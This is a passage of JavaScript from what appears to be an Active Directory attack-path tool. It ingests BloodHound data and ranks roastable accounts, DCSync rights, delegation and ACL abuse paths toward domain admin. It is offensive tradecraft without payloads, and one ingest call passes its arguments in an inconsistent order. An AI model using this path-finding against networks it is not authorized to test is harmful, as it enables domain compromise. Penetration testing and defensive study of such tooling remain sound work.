      + '<footer>Generated by OBOL from a BloodHound collection \u00b7 every path is a lead over collected edges, '
      + 'not a claim it was walked.</footer></div></body></html>';
  }

  // Fact minting (so the coach/graph can consume the ingest)
  function toFacts(summary, paths, scope) {
    var F = OBOL.facts;
    if (!F) throw new Error('OBOL.facts (facts.js) must be loaded before bloodhound.js');
    summary = summary || {};
    var ownedInputNames = [];
    if (Array.isArray(paths) && paths.length && typeof paths[0] === 'string') {
      ownedInputNames = paths.slice();
      paths = ownedPaths(summary, paths);
    }
    scope = scope || (summary.domain ? 'domain:' + summary.domain : 'domain:unknown');
    var out = [];
    function mk(kind, value, customScope) {
      out.push(F.makeFact({ kind: kind, scope: customScope || scope, value: value, state: F.ProofState.SUPPORTED, source: 'bloodhound ingest' }));
    }
    mk('ad.graph.collected', {
      users: summary.users || 0,
      computers: (summary.computers || []).length,
      domain_admins: (summary.domain_admins || []).length,
      enterprise_admins: (summary.enterprise_admins || []).length,
      domains: (summary.domains && summary.domains.length) ? summary.domains.slice() : (summary.domain ? [summary.domain] : [])
    });
    if (summary.domain) mk('ad.domain_known', { name: summary.domain });
    (summary.domains || []).forEach(function (d) {
      if (d && d !== summary.domain) mk('ad.domain_known', { name: d }, 'domain:' + d);
    });
    if (summary._graph && summary._graph.domain_sid) {
      mk('ad.domain_sid', { sid: summary._graph.domain_sid, domain: summary.domain || '' });
    }
    if (Array.isArray(summary.user_list) && summary.user_list.length) {
      mk('ad.user_list', { users: summary.user_list.slice(), count: summary.user_list.length, method: 'bloodhound' });
    }
    if (Array.isArray(summary.enabled_computers) && summary.enabled_computers.length) {
      mk('ad.computer_list', { computers: summary.enabled_computers.slice(), count: summary.enabled_computers.length, method: 'bloodhound' });
    }

    [['ad.kerberoastable', 'kerberoastable'], ['ad.asrep_roastable', 'asrep_roastable'],
     ['ad.dcsync_principals', 'dcsync_principals'], ['ad.unconstrained_delegation', 'unconstrained_delegation'],
     ['ad.high_value', 'high_value'], ['ad.esc_templates', 'esc_templates'],
     ['ad.foreign_principals', 'foreign_principals']].forEach(function (pair) {
      var items = summary[pair[1]] || [];
      if (items.length) mk(pair[0], { principals: items.slice(), count: items.length });
    });

    if (summary.trusts && summary.trusts.length) {
      mk('ad.trusts', { trusts: summary.trusts.slice(), count: summary.trusts.length });
      var seenTrustSids = {};
      var primaryDomUpper = String(summary.domain || '').toUpperCase();
      if (summary._graph && summary._graph.domain_sid && primaryDomUpper) {
        seenTrustSids[primaryDomUpper + '|' + summary._graph.domain_sid] = 1;
      }
      summary.trusts.forEach(function (t) {
        if (!t || !t.target_domain || !t.target_sid) return;
        var td = String(t.target_domain).trim();
        var ts = String(t.target_sid).trim();
        if (!td || !ts) return;
        var tk = td.toUpperCase() + '|' + ts;
        if (seenTrustSids[tk]) return;
        seenTrustSids[tk] = 1;
        mk('ad.domain_sid', { domain: td, sid: ts, via: 'bloodhound-trust' }, 'domain:' + td.toLowerCase());
      });
    }
    if (summary.constrained_delegation && summary.constrained_delegation.length) {
      mk('ad.delegation', { tool: 'bloodhound', type: 'constrained', targets: summary.constrained_delegation.slice(), count: summary.constrained_delegation.length });
    }
    if (summary.rbcd_targets && summary.rbcd_targets.length) {
      mk('ad.rbcd', { tool: 'bloodhound', targets: summary.rbcd_targets.slice(), count: summary.rbcd_targets.length });
    }
    if (summary.gpo_abuse && summary.gpo_abuse.length) {
      mk('ad.gpo_abuse', { tool: 'bloodhound', paths: summary.gpo_abuse.slice(), count: summary.gpo_abuse.length });
      var gMeta = summary._gpo_writable_meta || {};
      var gpos = Array.isArray(gMeta.gpos) ? gMeta.gpos.slice() : [];
      var gpoIds = Array.isArray(gMeta.gpo_ids) ? gMeta.gpo_ids.slice() : [];
      var gPrincipals = Array.isArray(gMeta.principals) ? gMeta.principals.slice() : [];
      summary.gpo_abuse.forEach(function (line) {
        var m = String(line || '').match(/^(.+?)\s+-\[[^\]]+\]->\s+(.+?)\s+->\s+/);
        if (m) {
          var actor = m[1].trim(), gpoName = m[2].trim();
          if (actor && gPrincipals.indexOf(actor) < 0) gPrincipals.push(actor);
          if (gpoName && gpos.indexOf(gpoName) < 0) gpos.push(gpoName);
        }
      });
      mk('ad.gpo_writable', {
        tool: 'bloodhound',
        gpo: gpos[0] || '',
        gpo_id: gpoIds[0] || '',
        gpos: gpos,
        gpo_ids: gpoIds,
        principals: gPrincipals,
        paths: summary.gpo_abuse.slice(),
        count: summary.gpo_abuse.length
      });
    }
    if (summary.sid_history && summary.sid_history.length) {
      mk('ad.sid_history', { tool: 'bloodhound', entries: summary.sid_history.slice(), count: summary.sid_history.length });
    }
    if (summary.gmsa_accounts && summary.gmsa_accounts.length) {
      mk('ad.gmsa', { tool: 'bloodhound', accounts: summary.gmsa_accounts.slice(), count: summary.gmsa_accounts.length });
    }
    if (summary.laps_computers && summary.laps_computers.length) {
      mk('ad.laps', { tool: 'bloodhound', computers: summary.laps_computers.slice(), count: summary.laps_computers.length });
    }
    if (summary.esc_templates && summary.esc_templates.length) {
      mk('adcs.vulnerable', { tool: 'bloodhound', templates: summary.esc_templates.slice() });
    }

    var gRef = summary._graph || null;
    var chains = paths || [];
    var first = null;
    var pathOwnedSids = [];
    if (chains && !Array.isArray(chains)) {
      first = chains.first || null;
      if (Array.isArray(chains.owned_sids)) pathOwnedSids = chains.owned_sids.slice();
      chains = chains.paths || [];
    }
    var validChains = (Array.isArray(chains) ? chains : []).filter(function (c) {
      return Array.isArray(c) && c.length > 0 && isObj(c[0]) && typeof c[0].edge === 'string';
    });
    var emittedAclLeadKeys = {};
    var emittedAclLeadCount = 0;
    if (validChains.length) {
      var daShortMap = {}, eaShortMap = {}, eaSids = {}, daSidsByDom = {}, opGoalSet = {};
      (summary.domain_admins || []).forEach(function (d) { daShortMap[label(d).toUpperCase()] = 1; });
      (summary.enterprise_admins || []).forEach(function (e) { eaShortMap[label(e).toUpperCase()] = 1; });
      if (gRef) {
        (gRef.operator_goal_sids || []).forEach(function (os) { if (os) opGoalSet[os] = 1; });
        var revMem = {};
        (gRef.members || []).forEach(function (e) { (revMem[e[1]] = revMem[e[1]] || []).push(e[0]); });
        (gRef.ea_sids || []).forEach(function (es) {
          if (!es) return;
          var eq = [es]; eaSids[es] = 1;
          for (var eqi = 0; eqi < eq.length; eqi++) {
            (revMem[eq[eqi]] || []).forEach(function (ms) {
              if (!eaSids[ms]) { eaSids[ms] = 1; eq.push(ms); }
            });
          }
        });
        (gRef.da_sids || []).forEach(function (ds) {
          if (!ds) return;
          var dDom = domainFromName((gRef.names || {})[ds]) ||
            ((gRef.nodes && gRef.nodes[ds] && gRef.nodes[ds].domain) ? String(gRef.nodes[ds].domain).toUpperCase() : '') ||
            String(summary.domain || '').toUpperCase() || '*';
          var dq = [ds], dSeen = {}; dSeen[ds] = 1;
          for (var dqi = 0; dqi < dq.length; dqi++) {
            (revMem[dq[dqi]] || []).forEach(function (ms) {
              (daSidsByDom[ms] = daSidsByDom[ms] || {})[dDom] = 1;
              if (!dSeen[ms]) { dSeen[ms] = 1; dq.push(ms); }
            });
          }
        });
      }
      var actionable = validChains.filter(function (c) {
        var h0 = c[0], hEnd = c[c.length - 1];
        if (!firstAbusable(c) && !(hEnd && opGoalSet[hEnd.to_sid])) return false;
        if (isBuiltinPrivilegedSid(h0.from_sid, h0.from)) return false;
        if (gRef && gRef.dc_computers && (gRef.dc_computers[h0.from_sid] || gRef.dc_computers[String(h0.from || '').toUpperCase()])) {
          return false;
        }
        var origShort = h0.from ? label(h0.from).toUpperCase() : '';
        if (h0.from_sid && gRef && gRef.ea_sids && gRef.ea_sids.length) {
          if (eaSids[h0.from_sid]) return false;
        } else if (eaShortMap[origShort]) {
          return false;
        }
        var goalDom = domainFromName(hEnd.to) ||
          (gRef && gRef.nodes && hEnd.to_sid && gRef.nodes[hEnd.to_sid] ? String(gRef.nodes[hEnd.to_sid].domain || '').toUpperCase() : '') ||
          (gRef && gRef.types && hEnd.to_sid && gRef.types[hEnd.to_sid] === 'domains' ? String(hEnd.to || '').toUpperCase() : '') ||
          String(summary.domain || '').toUpperCase();
        if (h0.from_sid && gRef && gRef.da_sids && gRef.da_sids.length) {
          var doms = daSidsByDom[h0.from_sid];
          if (doms && (doms['*'] || (goalDom && doms[goalDom]))) return false;
        } else if (daShortMap[origShort]) {
          var origDom = domainFromName(h0.from);
          if (!origDom || !goalDom || origDom === goalDom) return false;
        }
        return true;
      });
      if (actionable.length) {
        var shortest = actionable[0];
        first = firstAbusable(shortest);
        if (!first) {
          for (var ai = 1; ai < actionable.length; ai++) {
            first = firstAbusable(actionable[ai]);
            if (first) break;
          }
        }
        var goal = (shortest && shortest.length && shortest[shortest.length - 1]) ? shortest[shortest.length - 1].to : '';
        var value = {
          tool: 'bloodhound', evidence: 'reachability',
          path: shortest, paths: actionable, goal: goal
        };
        if (first) value.first_action = first;
        mk('ad.attack_paths', value);
        var shortestHops = Array.isArray(shortest) ? shortest : [];
        var nonMemberHops = shortestHops.filter(function (h) { return h && !/^memberof$/i.test(String(h.edge || '')); });
        if (first && (first.edge === 'GetChanges' || first.edge === 'GetChangesAll') && nonMemberHops.length <= 1) {
          mk('ad.control_paths', value);
          mk('ad.domain_control', { tool: 'bloodhound', right: 'DCSync', principal: first.from || '' });
        }
        var tgt = first ? (first.target || first.to) : (shortest[0] ? (shortest[0].to || '') : '');
        var tgtShort = String(tgt || '').split('@')[0].trim();
        if (first) {
          var pKey = String(first.from || '').toUpperCase() + '|' + first.edge + '|' + String(tgtShort || tgt).toUpperCase();
          emittedAclLeadKeys[pKey] = 1;
          emittedAclLeadCount += 1;
          mk('ad.acl_lead', {
            tool: 'bloodhound',
            principal: first.from || '',
            right: first.edge,
            target: tgtShort || tgt,
            targets: tgtShort ? [tgtShort] : [],
            edge: first.edge,
            first_action: first
          });
        }
        if ((first && first.edge === 'ReadGMSAPassword') || shortestHops.some(function (h) { return h.edge === 'ReadGMSAPassword'; })) {
          mk('ad.gmsa', { tool: 'bloodhound', edge: 'ReadGMSAPassword', target: tgt });
        }
        if ((first && (first.edge === 'ReadLAPSPassword' || first.edge === 'SyncLAPSPassword')) || shortestHops.some(function (h) { return h.edge === 'ReadLAPSPassword' || h.edge === 'SyncLAPSPassword'; })) {
          mk('ad.laps', { tool: 'bloodhound', edge: first ? first.edge : 'ReadLAPSPassword', target: tgt });
        }
        if ((first && (first.edge === 'AllowedToAct' || first.edge === 'AddAllowedToAct')) || shortestHops.some(function (h) { return h.edge === 'AllowedToAct' || h.edge === 'AddAllowedToAct'; })) {
          mk('ad.rbcd', { tool: 'bloodhound', edge: first ? first.edge : 'AllowedToAct', target: tgt });
          mk('ad.delegation', { tool: 'bloodhound', edge: first ? first.edge : 'AllowedToAct', target: tgt });
        }
        if ((first && first.edge === 'AllowedToDelegate') || shortestHops.some(function (h) { return h.edge === 'AllowedToDelegate'; })) {
          mk('ad.delegation', { tool: 'bloodhound', edge: 'AllowedToDelegate', target: tgt });
        }
        if ((first && first.edge === 'WriteSPN') || shortestHops.some(function (h) { return h.edge === 'WriteSPN'; })) {
          mk('ad.targeted_kerberoast', { tool: 'bloodhound', edge: 'WriteSPN', target: tgt });
        }
      }
    }

    var rawAclEdges = (gRef && Array.isArray(gRef.acl_edges)) ? gRef.acl_edges : (Array.isArray(summary.acl_edges) ? summary.acl_edges : []);
    if (rawAclEdges.length && emittedAclLeadCount < 20) {
      var aclLeadRights = {
        GenericAll: 1, GenericWrite: 1, WriteDacl: 1, WriteOwner: 1,
        ForceChangePassword: 1, AllExtendedRights: 1, AddMember: 1,
        AddKeyCredentialLink: 1, AddSelf: 1
      };
      var gNames = (gRef && gRef.names) || {};
      var gTypes = (gRef && gRef.types) || {};
      var gDcMap = (gRef && gRef.dc_computers) || {};
      var gAdminSet = buildAdminSidSet(gRef);
      var directOwnedSids = [];
      var directOwnedMap = {};
      if (gRef && ownedInputNames.length) {
        resolveOwnedSids(gRef, ownedInputNames).forEach(function (s) {
          if (s && !directOwnedMap[s]) { directOwnedMap[s] = 1; directOwnedSids.push(s); }
        });
      }
      pathOwnedSids.forEach(function (s) {
        if (s && !directOwnedMap[s]) { directOwnedMap[s] = 1; directOwnedSids.push(s); }
      });
      validChains.forEach(function (c) {
        var s0 = c[0] && c[0].from_sid;
        if (s0 && !directOwnedMap[s0]) { directOwnedMap[s0] = 1; directOwnedSids.push(s0); }
      });
      var ownedGroupMap = gRef && directOwnedSids.length ? memberGroupClosure(gRef, directOwnedSids) : {};
      var candidates = [];
      rawAclEdges.forEach(function (e) {
        if (!Array.isArray(e) || e.length < 3) return;
        var src = e[0], right = e[1], dst = e[2];
        if (!src || !dst || src === dst || !aclLeadRights[right]) return;
        var dstType = gTypes[dst] || '';
        if (dstType === 'ous' || dstType === 'containers') return;
        if (/-(?:500|502)$/i.test(src)) return;
        if (gDcMap[src] || (gNames[src] && gDcMap[String(gNames[src]).toUpperCase()])) return;
        if (gAdminSet[src] || isBuiltinPrivilegedSid(src, gNames[src])) return;
        var cSrc = canonicalWellKnownSid(src);
        if (/^S-1-(?:0-0|3-\d+|5-10|5-18|5-19|5-20|5-32-554)$/i.test(cSrc)) return;
        var srcFull = resolveSid(src, gNames);
        var dstFull = resolveSid(dst, gNames);
        var srcShort = String(srcFull || '').split('@')[0].trim();
        var dstShort = String(dstFull || '').split('@')[0].trim();
        if (!srcShort || !dstShort) return;
        if (/^S-1-\d+-/i.test(srcShort) || /^S-1-\d+-/i.test(dstShort)) return;
        var prio = directOwnedMap[src] ? 0 : (ownedGroupMap[src] ? 1 : 2);
        candidates.push({
          prio: prio,
          rank: edgeRank(right),
          srcShort: srcShort,
          dstShort: dstShort,
          right: right
        });
      });
      candidates.sort(function (a, b) {
        return (a.prio - b.prio) || (a.rank - b.rank) ||
          (a.srcShort < b.srcShort ? -1 : (a.srcShort > b.srcShort ? 1 : 0)) ||
          (a.dstShort < b.dstShort ? -1 : (a.dstShort > b.dstShort ? 1 : 0));
      });
      for (var ci = 0; ci < candidates.length && emittedAclLeadCount < 20; ci++) {
        var cand = candidates[ci];
        var cKey = cand.srcShort.toUpperCase() + '|' + cand.right + '|' + cand.dstShort.toUpperCase();
        if (emittedAclLeadKeys[cKey]) continue;
        emittedAclLeadKeys[cKey] = 1;
        emittedAclLeadCount += 1;
        mk('ad.acl_lead', {
          tool: 'bloodhound',
          principal: cand.srcShort,
          right: cand.right,
          edge: cand.right,
          target: cand.dstShort,
          targets: [cand.dstShort]
        });
      }
    }
    return out;
  }

  function newSummary() {
    return {
      domain: '', domains: [], trusts: [],
      users: 0, user_list: [], computers: [], enabled_computers: [], domain_admins: [],
      enterprise_admins: [], kerberoastable: [], asrep_roastable: [],
      high_value: [], unconstrained_delegation: [], constrained_delegation: [],
      rbcd_targets: [], sid_history: [], gpo_abuse: [], gmsa_accounts: [], laps_computers: [],
      dcsync_principals: [],
      admin_to: [], da_sessions: [], password_not_required: [], pwd_never_expires: [],
      can_rdp: [], can_winrm: [],
      rdp_reach: [], psremote_reach: [], dcom_reach: [],
      foreign_principals: [], esc_templates: [],
      ingested_at: Date.now() / 1000, files: [],
      _graph: newGraph()
    };
  }

  var DEDUP_KEYS = ['domains', 'user_list', 'computers', 'enabled_computers', 'domain_admins', 'enterprise_admins', 'kerberoastable',
    'asrep_roastable', 'high_value', 'unconstrained_delegation', 'constrained_delegation',
    'rbcd_targets', 'sid_history', 'gpo_abuse', 'gmsa_accounts', 'laps_computers',
    'dcsync_principals', 'admin_to', 'da_sessions', 'password_not_required', 'pwd_never_expires',
    'can_rdp', 'can_winrm', 'rdp_reach', 'psremote_reach', 'dcom_reach',
    'foreign_principals', 'esc_templates'];

  function dedupSorted(arr) {
    var seen = {}; var out = [];
    (arr || []).forEach(function (x) { var k = String(x); if (!(k in seen)) { seen[k] = 1; out.push(x); } });
    out.sort();
    return out;
  }

  function finalizeSummary(summary) {
    deriveCensus(summary);
    DEDUP_KEYS.forEach(function (k) {
      if (k === 'domains') {
        var seen = {}, dOut = [];
        (summary.domains || []).forEach(function (x) { if (x && !seen[x]) { seen[x] = 1; dOut.push(x); } });
        summary.domains = dOut;
      } else {
        summary[k] = dedupSorted(summary[k]);
      }
    });
    return summary;
  }

  // Synchronous ingest for in-memory objects or { domains: [...], users: [...], groups: [...], ... }
  function ingestObjects(input) {
    var summary = newSummary();
    if (Array.isArray(input)) {
      input.forEach(function (f) {
        if (!f) return;
        var name = f.name || f.kind || 'data.json';
        var payload = f.data !== undefined ? f.data : (f.text !== undefined ? f.text : f);
        summary.files.push(name);
        mergeJson(summary, name, payload);
      });
    } else if (isObj(input)) {
      Object.keys(input).forEach(function (k) {
        var val = input[k];
        if (!val) return;
        summary.files.push(k + '.json');
        mergeJson(k, val, summary, summary._graph);
      });
    }
    return finalizeSummary(summary);
  }

  function readUpload(file) {
    var name = file.name || '';
    var low = name.toLowerCase();
    if (low.slice(-4) === '.zip') {
      var JSZipRef = (typeof JSZip !== 'undefined') ? JSZip : (root.JSZip || (typeof globalThis !== 'undefined' && globalThis.JSZip));
      if (!JSZipRef) return Promise.reject(new Error('JSZip is required to read a .zip upload (vendored at assets/jszip.min.js)'));
      var buf = file.arrayBuffer || file.bytes;
      var loaded = (typeof buf === 'function') ? buf.call(file) : buf;
      return Promise.resolve(loaded).then(function (ab) {
        return JSZipRef.loadAsync(ab).then(function (zip) {
          var jobs = [];
          Object.keys(zip.files).forEach(function (inner) {
            if (inner.toLowerCase().slice(-5) === '.json' && !zip.files[inner].dir) {
              jobs.push(zip.files[inner].async('text').then(function (txt) { return [inner, txt]; }));
            }
          });
          return Promise.all(jobs);
        });
      });
    }
    if (low.slice(-5) === '.json') {
      if (typeof file.text === 'string') return Promise.resolve([[name, file.text]]);
      if (typeof file.text === 'function') return Promise.resolve(file.text()).then(function (t) { return [[name, t]]; });
      var b = file.arrayBuffer || file.bytes;
      var pending = (typeof b === 'function') ? b.call(file) : b;
      return Promise.resolve(pending).then(function (ab) {
        var txt = decodeBytes(ab);
        return [[name, txt]];
      });
    }
    return Promise.resolve([]);
  }

  function decodeBytes(ab) {
    if (typeof ab === 'string') return ab;
    if (typeof TextDecoder !== 'undefined') {
      return new TextDecoder('utf-8').decode(ab instanceof Uint8Array ? ab : new Uint8Array(ab));
    }
    if (typeof Buffer !== 'undefined') return Buffer.from(ab).toString('utf-8');
    var u8 = ab instanceof Uint8Array ? ab : new Uint8Array(ab);
    var s = ''; for (var i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]);
    return s;
  }

  function parse(files) {
    var summary = newSummary();
    var list = files || [];
    return list.reduce(function (chain, file) {
      return chain.then(function () {
        return readUpload(file).then(function (pairs) {
          pairs.forEach(function (pair) {
            summary.files.push(pair[0]);
            mergeJson(summary, pair[0], pair[1]);
          });
        }).catch(function () {});
      });
    }, Promise.resolve()).then(function () {
      return finalizeSummary(summary);
    });
  }

  function parseJson(jsonFiles) {
    var summary = newSummary();
    (jsonFiles || []).forEach(function (f) {
      if (!f || !f.name) return;
      if (f.name.toLowerCase().slice(-5) !== '.json') return;
      var text = typeof f.text === 'string' ? f.text : decodeBytes(f.arrayBuffer || f.bytes || '');
      summary.files.push(f.name);
      mergeJson(summary, f.name, text);
    });
    return finalizeSummary(summary);
  }

  function dropGraph(summary) {
    if (summary && summary._graph) { delete summary._graph; }
    return summary;
  }

  OBOL.bloodhound = {
    WELL_KNOWN_RID: WELL_KNOWN_RID,
    WELL_KNOWN_SID: WELL_KNOWN_SID,
    ABUSABLE_ACE: ABUSABLE_ACE,
    CONTROL_EDGES: CONTROL_EDGES,
    TRAVERSAL_EDGES: TRAVERSAL_EDGES,
    HIGH_VALUE_RE: HIGH_VALUE_RE,
    DCSYNC_RIGHTS: DCSYNC_RIGHTS,
    DCSYNC_OWNING: DCSYNC_OWNING,
    newGraph: newGraph,
    newSummary: newSummary,
    emptySummary: newSummary,
    mergeJson: mergeJson,
    ingestObjects: ingestObjects,
    ingestFiles: parse,
    ingestZip: parse,
    parse: parse,
    parseJson: parseJson,
    dropGraph: dropGraph,
    deriveCensus: deriveCensus,
    buildDeduplicatedGraph: buildDeduplicatedGraph,
    findPaths: ownedPaths,
    ownedPaths: ownedPaths,
    nearestToGoal: nearestToGoal,
    controls: controls,
    principalProfile: principalProfile,
    principalFacts: principalProfile,
    acquisitionLines: acquisitionLines,
    principalList: principalList,
    bestNextTargets: bestNextTargets,
    huntPaths: bestNextTargets,
    graphFingerprint: graphFingerprint,
    diffCollections: diffCollections,
    pathsToGraph: pathsToGraph,
    ownedPathGraph: ownedPathGraph,
    domainView: domainView,
    domainActionCommands: domainActionCommands,
    domainReportHtml: domainReportHtml,
    toFacts: toFacts,
    summaryToFacts: toFacts,
    prop: prop,
    resolveSid: resolveSid,
    canonicalWellKnownSid: canonicalWellKnownSid,
    isOperatorGoalGroup: isOperatorGoalGroup,
    resolvePrincipalSid: resolvePrincipalSid,
    isBroadPrincipal: isBroadPrincipal,
    isBuiltinPrivilegedSid: isBuiltinPrivilegedSid,
    domainOfSid: domainOfSid,
    firstAbusable: firstAbusable
  };

  if (typeof module !== 'undefined' && module.exports) { module.exports = OBOL.bloodhound; }
})(typeof globalThis !== 'undefined' ? globalThis : this);
